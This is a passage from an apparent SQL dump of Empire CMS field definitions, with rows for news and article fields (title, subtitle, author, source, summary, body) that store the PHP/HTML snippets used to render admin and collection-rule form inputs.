value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[ftitle]))?>\\\">\r\n','副标题',1,1,1,'\r\n  <tr bgcolor=\"#FFFFFF\"> \r\n    <td height=\"22\" valign=\"top\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\"textfield\" type=\"text\" id=\"textfield\" value=\"[!--ftitle--]\" size=\"20\">)</td>\r\n    <td><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\r\n        <tr> \r\n          <td><textarea name=\"add[zz_ftitle]\" cols=\"60\" rows=\"10\" id=\"textarea\"><?=ehtmlspecialchars(stripSlashes($r[zz_ftitle]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\"add[z_ftitle]\" type=\"text\" id=\"add[z_ftitle]\" value=\"<?=stripSlashes($r[z_ftitle])?>\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',0,'CHAR','120',1,1,'news',0,'',0,0,1,'<input name=\\\"ftitle\\\" type=\\\"text\\\" size=42 id=\\\"ftitle\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'ftitle\\\',stripSlashes($r[ftitle]))?>\\\">\r\n',0,'',0,'',0,0,'','','','','','',0,0,''),(6,'smalltext','内容简介','textarea','<textarea name=\\\"smalltext\\\" cols=\\\"80\\\" rows=\\\"10\\\" id=\\\"smalltext\\\"><?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[smalltext]))?></textarea>\r\n','内容简介',1,1,1,'\r\n  <tr bgcolor=\"#FFFFFF\"> \r\n    <td height=\"22\" valign=\"top\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\"textfield\" type=\"text\" id=\"textfield\" value=\"[!--smalltext--]\" size=\"20\">)</td>\r\n    <td><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\r\n        <tr> \r\n          <td><textarea name=\"add[zz_smalltext]\" cols=\"60\" rows=\"10\" id=\"textarea\"><?=ehtmlspecialchars(stripSlashes($r[zz_smalltext]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\"add[z_smalltext]\" type=\"text\" id=\"add[z_smalltext]\" value=\"<?=stripSlashes($r[z_smalltext])?>\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',2,'CHAR','255',1,1,'news',0,'',0,1,1,'<textarea name=\\\"smalltext\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"smalltext\\\"><?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'smalltext\\\',stripSlashes($r[smalltext]))?></textarea>\r\n',0,'',0,'',0,0,'','','','','','',0,1,''),(7,'writer','作者','text','<?php\r\n$writer_sql=$empire->query(\\\"select writer from {$dbtbpre}enewswriter\\\");\r\nwhile($w_r=$empire->fetch($writer_sql))\r\n{\r\n	$w_class.=\\\"<option value=\\\'\\\".$w_r[writer].\\\"\\\'>\\\".$w_r[writer].\\\"</option>\\\";\r\n}\r\n?>\r\n<input type=text name=writer value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[writer]))?>\\\" size=\\\"\\\"> \r\n        <select name=\\\"w_id\\\" id=\\\"select7\\\" onchange=\\\"document.add.writer.value=document.add.w_id.value\\\">\r\n          <option>选择作者</option>\r\n		  <?=$w_class?>\r\n        </select>\r\n<input type=\\\"button\\\" name=\\\"wbutton\\\" value=\\\"增加作者\\\" onclick=\\\"window.open(\\\'NewsSys/writer.php?<?=$ecms_hashur[ehref]?>&addwritername=\\\'+document.add.writer.value);\\\">\r\n','作者',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--writer--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_writer]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_writer]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_writer]\\\" type=\\\"text\\\" id=\\\"add[z_writer]\\\" value=\\\"<?=stripSlashes($r[z_writer])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',2,'CHAR','30',1,1,'news',0,'',0,0,1,'<input name=\\\"writer\\\" type=\\\"text\\\" id=\\\"writer\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'writer\\\',stripSlashes($r[writer]))?>\\\" size=\\\"\\\">\r\n',0,'',0,'',1,0,'','','','','','',0,0,''),(8,'befrom','信息来源','text','<?php\r\n$befrom_sql=$empire->query(\\\"select sitename from {$dbtbpre}enewsbefrom\\\");\r\nwhile($b_r=$empire->fetch($befrom_sql))\r\n{\r\n	$b_class.=\\\"<option value=\\\'\\\".$b_r[sitename].\\\"\\\'>\\\".$b_r[sitename].\\\"</option>\\\";\r\n}\r\n?>\r\n<input type=\\\"text\\\" name=\\\"befrom\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[befrom]))?>\\\" size=\\\"\\\"> \r\n        <select name=\\\"befrom_id\\\" id=\\\"befromid\\\" onchange=\\\"document.add.befrom.value=document.add.befrom_id.value\\\">\r\n          <option>选择信息来源</option>\r\n          <?=$b_class?>\r\n        </select>\r\n<input type=\\\"button\\\" name=\\\"wbutton\\\" value=\\\"增加来源\\\" onclick=\\\"window.open(\\\'NewsSys/BeFrom.php?<?=$ecms_hashur[ehref]?>&addsitename=\\\'+document.add.befrom.value);\\\">\r\n','信息来源',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--befrom--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_befrom]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_befrom]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_befrom]\\\" type=\\\"text\\\" id=\\\"add[z_befrom]\\\" value=\\\"<?=stripSlashes($r[z_befrom])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',2,'CHAR','60',1,1,'news',0,'',0,0,1,'<input name=\\\"befrom\\\" type=\\\"text\\\" id=\\\"befrom\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'befrom\\\',stripSlashes($r[befrom]))?>\\\" size=\\\"\\\">\r\n',0,'',0,'',1,0,'','','','','','',0,0,''),(9,'newstext','新闻正文','editor','<?=ECMS_ShowEditorVar(\\\"newstext\\\",$ecmsfirstpost==1?\\\"\\\":stripSlashes($r[newstext]),\\\"Default\\\",\\\"\\\",\\\"300\\\",\\\"100%\\\")?>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" bgcolor=\\\"#DBEAF5\\\">\r\n          <tr> \r\n            <td bgcolor=\\\"#FFFFFF\\\"> <input name=\\\"dokey\\\" type=\\\"checkbox\\\" value=\\\"1\\\"<?=$r[dokey]==1?\\\' checked\\\':\\\'\\\'?>>\r\n              关键字替换&nbsp;&nbsp; <input name=\\\"copyimg\\\" type=\\\"checkbox\\\" id=\\\"copyimg\\\" value=\\\"1\\\">\r\n      远程保存图片(\r\n      <input name=\\\"mark\\\" type=\\\"checkbox\\\" id=\\\"mark\\\" value=\\\"1\\\">\r\n      <a href=\\\"SetEnews.php<?=$ecms_hashur[whehref]?>\\\" target=\\\"_blank\\\">加水印</a>)&nbsp;&nbsp; \r\n      <input name=\\\"copyflash\\\" type=\\\"checkbox\\\" id=\\\"copyflash\\\" value=\\\"1\\\">\r\n      远程保存FLASH(地址前缀： \r\n      <input name=\\\"qz_url\\\" type=\\\"text\\\" id=\\\"qz_url\\\" size=\\\"\\\">\r\n              )</td>\r\n          </tr>\r\n          <tr>\r\n            \r\n    <td bgcolor=\\\"#FFFFFF\\\"><input name=\\\"repimgnexturl\\\" type=\\\"checkbox\\\" id=\\\"repimgnexturl\\\" value=\\\"1\\\"> 图片链接转为下一页&nbsp;&nbsp; <input name=\\\"autopage\\\" type=\\\"checkbox\\\" id=\\\"autopage\\\" value=\\\"1\\\">自动分页\r\n      ,每 \r\n      <input name=\\\"autosize\\\" type=\\\"text\\\" id=\\\"autosize\\\" value=\\\"5000\\\" size=\\\"5\\\">\r\n      个字节为一页&nbsp;&nbsp; 取第 \r\n      <input name=\\\"getfirsttitlepic\\\" type=\\\"text\\\" id=\\\"getfirsttitlepic\\\" value=\\\"\\\" size=\\\"1\\\">\r\n      张上传图为标题图片( \r\n      <input name=\\\"getfirsttitlespic\\\" type=\\\"checkbox\\\" id=\\\"getfirsttitlespic\\\" value=\\\"1\\\">\r\n      缩略图: 宽 \r\n      <input name=\\\"getfirsttitlespicw\\\" type=\\\"text\\\" id=\\\"getfirsttitlespicw\\\" size=\\\"3\\\" value=\\\"<?=$public_r[spicwidth]?>\\\">\r\n      *高\r\n      <input name=\\\"getfirsttitlespich\\\" type=\\\"text\\\" id=\\\"getfirsttitlespich\\\" size=\\\"3\\\" value=\\\"<?=$public_r[spicheight]?>\\\">\r\n      )</td>\r\n          </tr>\r\n        </table>\r\n','新闻正文',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--newstext--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_newstext]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_newstext]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_newstext]\\\" type=\\\"text\\\" id=\\\"add[z_newstext]\\\" value=\\\"<?=stripSlashes($r[z_newstext])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',2,'MEDIUMTEXT','',1,1,'news',0,'',0,1,1,'<?=ECMS_ShowEditorVar(\\\"newstext\\\",$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'newstext\\\',stripSlashes($r[newstext])),\\\"Default\\\",\\\"\\\",\\\"300\\\",\\\"100%\\\")?>\r\n',0,'',0,'',1,1,'','','','','','',0,0,''),(10,'diggtop','顶','text','\r\n<input name=\"diggtop\" type=\"text\" id=\"diggtop\" value=\"<?=$ecmsfirstpost==1?\"\":ehtmlspecialchars(stripSlashes($r[diggtop]))?>\" size=\"\">\r\n','',1,1,1,'\r\n  <tr bgcolor=\"#FFFFFF\"> \r\n    <td height=\"22\" valign=\"top\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\"textfield\" type=\"text\" id=\"textfield\" value=\"[!--diggtop--]\" size=\"20\">)</td>\r\n    <td><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\r\n        <tr> \r\n          <td><textarea name=\"add[zz_diggtop]\" cols=\"60\" rows=\"10\" id=\"textarea\"><?=ehtmlspecialchars(stripSlashes($r[zz_diggtop]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\"add[z_diggtop]\" type=\"text\" id=\"add[z_diggtop]\" value=\"<?=stripSlashes($r[z_diggtop])?>\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',3,'INT','',1,1,'news',0,'',0,0,1,'\r\n<input name=\"diggtop\" type=\"text\" id=\"diggtop\" value=\"<?=$ecmsfirstpost==1?\"\":DoReqValue($mid,\'diggtop\',stripSlashes($r[diggtop]))?>\" size=\"\">\r\n',0,'',0,'',0,0,'','','','','','',0,0,''),(88,'title','标题','text','<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" bgcolor=\\\"#DBEAF5\\\">\r\n<tr> \r\n  <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\">\r\n	<?=$tts?\\\"<select name=\\\'ttid\\\'><option value=\\\'0\\\'>标题分类</option>$tts</select>\\\":\\\"\\\"?>\r\n	<input type=text name=title value=\\\"<?=ehtmlspecialchars(stripSlashes($r[title]))?>\\\" size=\\\"60\\\"> \r\n	<input type=\\\"button\\\" name=\\\"button\\\" value=\\\"图文\\\" onclick=\\\"document.add.title.value=document.add.title.value+\\\'(图文)\\\';\\\"> \r\n  </td>\r\n</tr>\r\n<tr> \r\n  <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\">属性: \r\n	<input name=\\\"titlefont[b]\\\" type=\\\"checkbox\\\" value=\\\"b\\\"<?=$titlefontb?>>粗体\r\n	<input name=\\\"titlefont[i]\\\" type=\\\"checkbox\\\" value=\\\"i\\\"<?=$titlefonti?>>斜体\r\n	<input name=\\\"titlefont[s]\\\" type=\\\"checkbox\\\" value=\\\"s\\\"<?=$titlefonts?>>删除线\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;颜色: <input name=\\\"titlecolor\\\" type=\\\"text\\\" value=\\\"<?=stripSlashes($r[titlecolor])?>\\\" size=\\\"10\\\" class=\\\"color\\\">\r\n  </td>\r\n</tr>\r\n</table>\r\n','标题',0,1,1,'\r\n  <tr bgcolor=\"#FFFFFF\"> \r\n    <td height=\"22\" valign=\"top\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\"textfield\" type=\"text\" id=\"textfield\" value=\"[!--title--]\" size=\"20\">)</td>\r\n    <td><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\r\n        <tr> \r\n          <td><textarea name=\"add[zz_title]\" cols=\"60\" rows=\"10\" id=\"textarea\"><?=ehtmlspecialchars(stripSlashes($r[zz_title]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\"add[z_title]\" type=\"text\" id=\"add[z_title]\" value=\"<?=stripSlashes($r[z_title])?>\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',0,'CHAR','100',1,7,'article',0,'',0,0,0,'<input name=\\\"title\\\" type=\\\"text\\\" size=\\\"42\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'title\\\',stripSlashes($r[title]))?>\\\">\r\n',0,'',0,'60',0,0,'','','','','','',0,0,''),(89,'special.field','特殊属性','','\r\n<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bgcolor=\"#DBEAF5\">\r\n  <tr>\r\n    <td height=\"25\" bgcolor=\"#FFFFFF\">信息属性: \r\n      <input name=\"checked\" type=\"checkbox\" value=\"1\"<?=$r[checked]?\' checked\':\'\'?>>\r\n      审核 &nbsp;&nbsp; 推荐 \r\n      <select name=\"isgood\" id=\"isgood\">\r\n        <option value=\"0\">不推荐</option>\r\n	<?=$ftnr[\'igname\']?>\r\n      </select>\r\n      &nbsp;&nbsp; 头条 \r\n      <select name=\"firsttitle\" id=\"firsttitle\">\r\n        <option value=\"0\">非头条</option>\r\n	<?=$ftnr[\'ftname\']?>\r\n      </select></td>\r\n  </tr>\r\n  <tr> \r\n    <td height=\"25\" bgcolor=\"#FFFFFF\">关键字&nbsp;&nbsp;&nbsp;: \r\n      <input name=\"keyboard\" type=\"text\" size=\"52\" value=\"<?=stripSlashes($r[keyboard])?>\">\r\n      <font color=\"#666666\">(多个请用&quot;,&quot;隔开)</font></td>\r\n  </tr>\r\n  <tr> \r\n    <td height=\"25\" bgcolor=\"#FFFFFF\">外部链接: \r\n      <input name=\"titleurl\" type=\"text\" value=\"<?=stripSlashes($r[titleurl])?>\" size=\"52\">\r\n      <font color=\"#666666\">(填写后信息连接地址将为此链接)</font></td>\r\n  </tr>\r\n</table>\r\n','特殊属性',0,1,0,'\r\n\r\n',1,'','0',0,7,'article',0,'',0,0,0,'\r\n<input name=\"keyboard\" type=\"text\" size=42 value=\"<?=stripSlashes($r[keyboard])?>\">\r\n<font color=\"#666666\">(多个请用&quot;,&quot;隔开)</font>\r\n',0,'',0,'',0,0,'','','','','','',0,0,''),(90,'titlepic','标题图片','img','<input name=\\\"titlepic\\\" type=\\\"text\\\" id=\\\"titlepic\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[titlepic]))?>\\\" size=\\\"45\\\">\r\n<a onclick=\\\"window.open(\\\'ecmseditor/FileMain.php?type=1&classid=<?=$classid?>&infoid=<?=$id?>&filepass=<?=$filepass?>&sinfo=1&doing=1&field=titlepic<?=$ecms_hashur[ehref]?>\\\',\\\'\\\',\\\'width=700,height=550,scrollbars=yes\\\');\\\" title=\\\"选择已上传的图片\\\"><img src=\\\"../data/images/changeimg.gif\\\" border=\\\"0\\\" align=\\\"absbottom\\\"></a> \r\n','标题图片',0,1,1,'\r\n  <tr bgcolor=\"#FFFFFF\"> \r\n    <td height=\"22\" valign=\"top\"><strong>[!--enews.name--]正则：</strong><br>\r\n      ( \r\n      <input name=\"textfield\" type=\"text\" id=\"textfield\" value=\"[!--titlepic--]\" size=\"20\">\r\n      )</td>\r\n    <td><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\r\n    <tr>\r\n      <td>附件前缀 \r\n        <input name=\"add[qz_titlepic]\" type=\"text\" id=\"add[qz_titlepic]\" value=\"<?=stripSlashes($r[qz_titlepic])?>\"> \r\n        <input name=\"add[save_titlepic]\" type=\"checkbox\" id=\"add[save_titlepic]\" value=\" checked\"<?=$r[save_titlepic]?>>\r\n        远程保存 </td>\r\n    </tr>\r\n    <tr> \r\n      <td><textarea name=\"add[zz_titlepic]\" cols=\"60\" rows=\"10\" id=\"add[zz_titlepic]\"><?=ehtmlspecialchars(stripSlashes($r[zz_titlepic]))?></textarea></td>\r\n    </tr>\r\n    <tr> \r\n      <td><input name=\"add[z_titlepic]\" type=\"text\" id=\"titlepic5\" value=\"<?=stripSlashes($r[z_titlepic])?>\">\r\n        (如填写这里，这就是字段的值)</td>\r\n    </tr>\r\n  </table></td>\r\n  </tr>\r\n',2,'CHAR','120',1,7,'article',0,'',0,0,0,'<input type=\\\"file\\\" name=\\\"titlepicfile\\\" size=\\\"45\\\">\r\n',0,'',0,'60',0,0,'','','','','','',0,0,''),(91,'newstime','发布时间','text','<input name=\\\"newstime\\\" type=\\\"text\\\" value=\\\"<?=$r[newstime]?>\\\" size=\\\"28\\\" class=\\\"Wdate\\\" onClick=\\\"WdatePicker({skin:\\\'default\\\',dateFmt:\\\'yyyy-MM-dd HH:mm:ss\\\'})\\\"><input type=button name=button value=\\\"设为当前时间\\\" onclick=\\\"document.add.newstime.value=\\\'<?=$todaytime?>\\\'\\\">\r\n','发布时间',0,1,1,'\r\n  <tr bgcolor=\"#FFFFFF\"> \r\n    <td height=\"22\" valign=\"top\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\"textfield\" type=\"text\" id=\"textfield\" value=\"[!--newstime--]\" size=\"20\">)</td>\r\n    <td><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\r\n        <tr> \r\n          <td><textarea name=\"add[zz_newstime]\" cols=\"60\" rows=\"10\" id=\"textarea\"><?=ehtmlspecialchars(stripSlashes($r[zz_newstime]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\"add[z_newstime]\" type=\"text\" id=\"add[z_newstime]\" value=\"<?=stripSlashes($r[z_newstime])?>\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',1,'INT','11',1,7,'article',0,'',1,0,0,'\r\n',0,'',0,'',0,0,'','','','','','',0,0,''),(92,'ftitle','副标题','text','<input name=\\\"ftitle\\\" type=\\\"text\\\" id=\\\"ftitle\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[ftitle]))?>\\\" size=\\\"60\\\">\r\n','',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--ftitle--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_ftitle]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_ftitle]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_ftitle]\\\" type=\\\"text\\\" id=\\\"add[z_ftitle]\\\" value=\\\"<?=stripSlashes($r[z_ftitle])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',0,'CHAR','120',1,7,'article',0,'',0,0,1,'<input name=\\\"ftitle\\\" type=\\\"text\\\" id=\\\"ftitle\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'ftitle\\\',stripSlashes($r[ftitle]))?>\\\" size=\\\"42\\\">\r\n',0,'',0,'60',0,0,'','','','','','',0,0,''),(93,'smalltext','内容简介','textarea','<textarea name=\\\"smalltext\\\" cols=\\\"80\\\" rows=\\\"10\\\" id=\\\"smalltext\\\"><?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[smalltext]))?></textarea>\r\n','',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--smalltext--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_smalltext]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_smalltext]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_smalltext]\\\" type=\\\"text\\\" id=\\\"add[z_smalltext]\\\" value=\\\"<?=stripSlashes($r[z_smalltext])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',2,'CHAR','255',1,7,'article',0,'',0,1,1,'<textarea name=\\\"smalltext\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"smalltext\\\"><?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'smalltext\\\',stripSlashes($r[smalltext]))?></textarea>\r\n',0,'',0,'80,10',0,0,'','','','','','',0,1,''),(94,'writer','作者','text','<?php\r\n$writer_sql=$empire->query(\\\"select writer from {$dbtbpre}enewswriter\\\");\r\nwhile($w_r=$empire->fetch($writer_sql))\r\n{\r\n	$w_class.=\\\"<option value=\\\'\\\".$w_r[writer].\\\"\\\'>\\\".$w_r[writer].\\\"</option>\\\";\r\n}\r\n?>\r\n<input type=text name=writer value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[writer]))?>\\\" size=\\\"\\\"> \r\n        <select name=\\\"w_id\\\" id=\\\"select7\\\" onchange=\\\"document.add.writer.value=document.add.w_id.value\\\">\r\n          <option>选择作者</option>\r\n		  <?=$w_class?>\r\n        </select>\r\n<input type=\\\"button\\\" name=\\\"wbutton\\\" value=\\\"增加作者\\\" onclick=\\\"window.open(\\\'NewsSys/writer.php?<?=$ecms_hashur[ehref]?>&addwritername=\\\'+document.add.writer.value);\\\">\r\n','',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--writer--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_writer]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_writer]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_writer]\\\" type=\\\"text\\\" id=\\\"add[z_writer]\\\" value=\\\"<?=stripSlashes($r[z_writer])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',2,'CHAR','30',1,7,'article',0,'',0,0,1,'<input name=\\\"writer\\\" type=\\\"text\\\" id=\\\"writer\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'writer\\\',stripSlashes($r[writer]))?>\\\" size=\\\"\\\">\r\n',0,'',0,'',0,0,'','','','','','',0,0,''),(95,'befrom','信息来源','text','<?php\r\n$befrom_sql=$empire->query(\\\"select sitename from {$dbtbpre}enewsbefrom\\\");\r\nwhile($b_r=$empire->fetch($befrom_sql))\r\n{\r\n	$b_class.=\\\"<option value=\\\'\\\".$b_r[sitename].\\\"\\\'>\\\".$b_r[sitename].\\\"</option>\\\";\r\n}\r\n?>\r\n<input type=\\\"text\\\" name=\\\"befrom\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[befrom]))?>\\\" size=\\\"\\\"> \r\n        <select name=\\\"befrom_id\\\" id=\\\"befromid\\\" onchange=\\\"document.add.befrom.value=document.add.befrom_id.value\\\">\r\n          <option>选择信息来源</option>\r\n          <?=$b_class?>\r\n        </select>\r\n<input type=\\\"button\\\" name=\\\"wbutton\\\" value=\\\"增加来源\\\" onclick=\\\"window.open(\\\'NewsSys/BeFrom.php?<?=$ecms_hashur[ehref]?>&addsitename=\\\'+document.add.befrom.value);\\\">\r\n','',1,1,1,'\r\n  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--befrom--]\\\" size=\\\"20\\\">)</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td><textarea name=\\\"add[zz_befrom]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"textarea\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_befrom]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\\\"add[z_befrom]\\\" type=\\\"text\\\" id=\\\"add[z_befrom]\\\" value=\\\"<?=stripSlashes($r[z_befrom])?>\\\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n',2,'CHAR','60',1,7,'article',0,'',0,0,1,'<input name=\\\"befrom\\\" type=\\\"text\\\" id=\\\"befrom\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'befrom\\\',stripSlashes($r[befrom]))?>\\\" size=\\\"\\\">\r\n',0,'',0,'',0,0,'','','','','','',0,0,''),(96,'newstext','新闻正文','editor','<?=ECMS_ShowEditorVar(\\\"newstext\\\",$ecmsfirstpost==1?\\\"\\\":stripSlashes($r[newstext]),\\\"Default\\\",\\\"\\\",\\\"300\\\",\\\"100%\\\")?>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" bgcolor=\\\"#DBEAF5\\\">\r\n          <tr> \r\n            <td bgcolor=\\\"#FFFFFF\\\"> <input name=\\\"dokey\\\" type=\\\"checkbox\\\" value=\\\"1\\\"<?=$r[dokey]==1?\\\' checked\\\':\\\'\\\'?>>\r\n              关键字替换&nbsp;&nbsp; <input name=\\\"copyimg\\\" type=\\\"checkbox\\\" id=\\\"copyimg\\\" value=\\\"1\\\">\r\n      远程保存图片(\r\n      <input name=\\\"mark\\\" type=\\\"checkbox\\\" id=\\\"mark\\\" 